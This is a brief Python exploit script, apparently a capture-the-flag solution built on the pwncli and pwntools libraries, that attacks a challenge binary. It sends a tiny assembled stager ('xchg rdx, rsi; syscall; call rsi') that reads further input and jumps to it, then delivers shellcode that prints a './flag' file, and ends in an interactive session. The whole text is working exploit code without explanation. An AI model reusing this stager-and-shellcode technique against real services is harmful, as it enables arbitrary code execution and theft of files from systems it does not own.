from pwncli import *

cli_script()

p:tube = gift['io']

p.sendlineafter("will you continue?(enter 'n' to quit) :", "y")

payload = asm("xchg rdx, rsi;syscall;call rsi")

p.sendafter("start!!!!", payload)

p.sendline(b"a"*5 + asm(shellcraft.cat("./flag")))

p.interactive()